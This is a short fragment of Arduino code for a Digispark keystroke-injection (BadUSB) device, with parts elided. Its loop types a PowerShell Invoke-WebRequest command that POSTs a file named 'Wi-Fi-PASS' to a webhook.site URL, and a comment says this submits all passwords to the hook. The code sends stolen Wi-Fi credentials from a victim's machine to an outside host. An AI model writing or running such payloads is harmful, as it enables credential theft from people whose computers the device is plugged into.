...
void loop() {
  ...
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/ed41bc1f-122c-43b2-83e5-f7fb480da3f7 -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
